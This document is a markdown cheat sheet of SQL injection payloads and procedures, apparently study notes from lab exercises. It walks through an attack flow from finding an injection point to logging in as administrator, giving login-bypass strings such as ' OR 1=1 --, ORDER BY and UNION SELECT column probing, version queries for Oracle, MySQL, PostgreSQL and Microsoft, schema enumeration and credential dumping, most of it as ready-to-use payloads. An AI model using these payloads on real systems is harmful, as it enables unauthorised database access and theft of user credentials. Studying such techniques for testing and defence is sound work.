# Payloads and Procedures
## Attack Flow
```
Identify injection point
        ↓
Confirm SQL Injection
        ↓
Determine number of columns
        ↓
Determine which columns display text
        ↓
Extract database metadata
        ↓
Find interesting tables
        ↓
Find interesting columns
        ↓
Extract credentials
        ↓
Login as administrator
```

## Before starting know
Different dbs have different ways of commenting like -
- Oracle: "--" used at the end
- Microsoft: "--"
	       "/* * /" (without any space between * and /)
- PostgreSQL: "--"
            "/* * /" (without any space between * and /)
            "#"
- MySQL: "-- " with space after the double dash
         "/* * /" (without any space between * and /)

##### **Note:**
Sometimes the comment won't work directly and might need URL encoding.
```URL encoding
-- : %2d%2d
#  : %23
"  : %22
'  : %27
@  : %40
/  : %2F
<  : %3C
>  : %3E
```

## **In-Band SQLi (Classic)**
#### Login Pages
1. Start with username field
   ```bash
   'OR1=1--
   ' OR 1 = 1 --
   ```

#### Categories or parameters - URL based
1. Start with finding the number of **Columns** through:
   ```sql
   Change the type of commenting as per the db working on.
   
   'ORDER BY 1--     ['+ORDER+BY+1--] OR ['+ORDER+BY+1#]
   'ORDER BY 2--     ['+ORDER+BY+2--]
   .
   .
   . [Increase the number until the application throws an error or behaves
   differently.]
   The number used just before getting error means that is no. of column in the db
   
   'UNION SELECT NULL--
   'UNION SELECT NULL, NULL--
   .
   .
   . [Keep increasing the number of `NULL`s until the query succeeds.]
   In this query, as soon as the query succeeds that is the number of columns in db
   
   **KEEP THE COMMENT ACCORDING TO THE DB DEALING WITH**
   ```

 2. Identify which column accepts text:
    Once you know the number of columns, replace each `NULL` one at a time with a string.
    ```sql 
    For a 3-column query:
    ' UNION SELECT 'abc',NULL,NULL--
    
    If error:
    ' UNION SELECT NULL,'abc',NULL--
    
    If error:
    ' UNION SELECT NULL,NULL,'abc'--
    
    Suppose:
    ' UNION SELECT NULL,'abc',NULL-- 
    works and displays `abc`.
    Then column 2 accepts text.
    
    Continue:
    ' UNION SELECT NULL,'abc','def'--
    OR
    '+UNION+SELECT+NULL,+'abc','def'--
    If both appear on the page, columns 2 and 3 are text-capable.
    
    Similarly check if all the columns are text capable in 2-column query or any.
    Like:
    '+UNION+SELECT+'abc','def'+FROM+dual--
    [In Oracle - *dual* is a special Oracle table.]
    
    **KEEP THE COMMENT ACCORDING TO THE DB DEALING WITH**
    ```
    
 3. For version related or db related results:
    ```sql
    For Oracle db:
    we use "v$version"
    - SELECT banner FROM v$version
    - SELECT version FROM v$instance
    
    Microsoft - SELECT @@version
    PostgreSQL - SELECT version()
    MySQL - @@version
    
    Example:
    ' UNION SELECT banner,NULL,NULL FROM v$version--
    OR
    '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
    No. of NULL depends on the no. of columns
    
    For example if the query is suceeding for say 2 columns and are text-capable
    just change the value of one column to @@version (depending on db) for 
    Microsoft, PostgreSQL and MySQL.
    
    Samples are: 
    ' UNION SELECT @@version,'James'#
    OR
    '+UNION+SELECT+%40%40version,'James'%23
    OR
    '+UNION+SELECT+@@version,+NULL# (here as well # can be converted to %23)
    
    **KEEP THE COMMENT ACCORDING TO THE DB DEALING WITH**
    ```
    
 4. Enumerate Database Tables:
    After gathering the information regarding - no. of columns, what all columns are text-capable, next step is to query the metadata of tables.
    ```sql
    For MySQL db:
    ' UNION SELECT table_name,NULL FROM information_schema.tables--
    Look through the responses that will be the tables stored in the db.
    The most unusual tablename mostly contains the credentials like - 
    user_afuhra
    
    Other method for url encoded queries:
    '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
    
    
    For Oracle db:
    ' UNION SELECT table_name,NULL FROM all_tables--
    OR
    '+UNION+SELECT+table_name,NULL+FROM+all_tables--
    ```
    
 5. Enumerate Columns of Interesting Tables:
    Suppose the table found is: user_afuhra
    Discover its columns
    ```sql
    For MySQL db:
    ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE 
    table_name='users_xkfjta'--
    
    '
    
    For Oracle db:
    ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE 
    table_name='USERS_XYZ'
    
    Outcomes would be the column names within the table like:
    username_dgdfag / email / password_asiheq
    ```
    
 6. Extract User Credentials:
    Based on the found columns you can further proceed towards extracting the creds.
    ```sql
    ' UNION SELECT username_jghs,password_mzqp FROM users_xkfjta--
    OR
    '+UNION+SELECT+USERNAME_TZRXMS,+PASSWORD_OPYIVR+FROM+USERS_LIQWEK--
    
    Through this we can get the usernames and passwords
    Dump Data
    ' UNION SELECT username,password FROM target_table
    ```
    If there is any administrator username available or any high role username with password we can use it to get the access.
